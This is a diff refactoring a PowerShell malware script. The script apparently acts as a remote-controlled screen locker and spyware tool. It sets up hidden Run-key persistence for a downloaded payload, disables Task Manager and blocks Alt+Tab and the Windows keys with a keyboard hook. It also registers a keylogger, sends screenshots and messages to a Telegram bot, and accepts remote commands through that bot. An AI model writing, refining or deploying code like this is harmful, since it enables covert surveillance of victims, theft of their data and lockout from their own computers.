@@ -25,11 +25,14 @@ function Setup-Persistence {
             New-Item -ItemType Directory -Path $localFolder -Force | Out-Null
         }
         if (-not (Test-Path $localFile)) {
-            Invoke-WebRequest -Uri $githubURL -OutFile $localFile -UseBasicParsing
+            Invoke-WebRequest -Uri $githubURL -OutFile $localFile
         }
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty -Path $regPath -Name "PawnshopLock" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$localFile""
-    } catch {}
+        $value = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localFile`""
+        Set-ItemProperty -Path $regPath -Name "PawnshopLock" -Value $value
+    } catch {
+        # Consider logging error here
+    }
 }
 
 # --- SEND TELEGRAM MESSAGE ---
@@ -38,31 +41,24 @@ function Send-Telegram {
     try {
         $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
         Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
-    } catch {}
+    } catch {
+        # Consider logging error here
+    }
 }
 
 # --- SEND TELEGRAM PHOTO ---
 function Send-TelegramPhoto {
     param([string]$photoPath, [string]$caption = "")
     try {
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-        $header = "--$boundary$LF" +
-                  "Content-Disposition: form-data; name="chat_id"$LF$LF$chatID$LF" +
-                  "--$boundary$LF" +
-                  "Content-Disposition: form-data; name="caption"$LF$LF$caption$LF" +
-                  "--$boundary$LF" +
-                  "Content-Disposition: form-data; name="photo"; filename="image.jpg"$LF" +
-                  "Content-Type: image/jpeg$LF$LF"
-        $footer = "$LF--$boundary--$LF"
-
-        $photoBytes = [System.IO.File]::ReadAllBytes($photoPath)
-        $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($header) + $photoBytes + [System.Text.Encoding]::ASCII.GetBytes($footer)
-
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
-        $wc.UploadData("https://api.telegram.org/bot$botToken/sendPhoto", "POST", $bodyBytes) | Out-Null
-    } catch {}
+        $form = @{
+            chat_id = $chatID
+            caption = $caption
+            photo   = Get-Item $photoPath
+        }
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendPhoto" -Method Post -Form $form
+    } catch {
+        # Consider logging error here
+    }
 }
 
 # --- DISABLE TASK MANAGER ---
@@ -73,7 +69,9 @@ function Disable-TaskManager {
             New-Item -Path $regPath -Force | Out-Null
         }
         Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 1 -Type DWord -Force
-    } catch {}
+    } catch {
+        # Consider logging error here
+    }
 }
 
 # --- ENABLE TASK MANAGER ---
@@ -83,7 +81,9 @@ function Enable-TaskManager {
         if (Test-Path $regPath) {
             Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 0 -Type DWord -Force
         }
-    } catch {}
+    } catch {
+        # Consider logging error here
+    }
 }
 
 # --- SCREENSHOT FUNCTION ---
@@ -178,7 +178,7 @@ function On-KeywordDetected {
 # Register event handler
 [KeyLogger]::OnKeywordDetected += { param($text) On-KeywordDetected $text }
 
-# --- EXTENDED KEYBOARD BLOCKER (same as before) ---
+# --- EXTENDED KEYBOARD BLOCKER ---
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -215,27 +215,15 @@ public class KeyBlocker {
 
             bool altPressed = (GetAsyncKeyState(0x12) & 0x8000) != 0;
             bool ctrlPressed = (GetAsyncKeyState(0x11) & 0x8000) != 0;
-            bool shiftPressed = (GetAsyncKeyState(0x10) & 0x8000) != 0;
 
-            // Block Ctrl+Esc, Alt+Tab, Alt+Esc, Win keys, Esc, Ctrl+Shift+Esc (Task Manager)
-            if (
-                (vkCode == 0x1B && ctrlPressed) ||       // Ctrl+Esc
-                (vkCode == 0x09 && altPressed) ||        // Alt+Tab
-                (vkCode == 0x1B && altPressed) ||        // Alt+Esc
-                (vkCode == 0x5B) ||                      // Left Win
-                (vkCode == 0x5C) ||                      // Right Win
-                (vkCode == 0x1B) ||                      // Esc alone
-                (vkCode == 0x1B && ctrlPressed && shiftPressed) // Ctrl+Shift+Esc
-            ) {
-                return (IntPtr)1; // Block these keys/combinations
+            // Block Alt+Tab, Ctrl+Esc, Alt+Esc, Windows keys
+            if ((vkCode == 0x09 && altPressed) || // Alt+Tab
+                (vkCode == 0x1B && ctrlPressed) || // Ctrl+Esc
+                (vkCode == 0x1B && altPressed) || // Alt+Esc
+                (vkCode == 0x5B) || // Left Windows
+                (vkCode == 0x5C)) { // Right Windows
+                return (IntPtr)1; // Block key
             }
-
-            // Block all other keys if locked
-            if ($global:lockActive) {
-                return (IntPtr)1;
-            }
-
-            return CallNextHookEx(hookId, nCode, wParam, lParam);
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
@@ -349,7 +337,6 @@ while ($true) {
                 }
                 elseif ($u.message.text.StartsWith($execCmdPrefix)) {
                     # Handled inside Lock-PC timer to avoid concurrency issues
-                    # But can be handled here if needed
                 }
                 elseif ($u.message.text -eq $screenshotCmd) {
                     $shot = Take-Screenshot
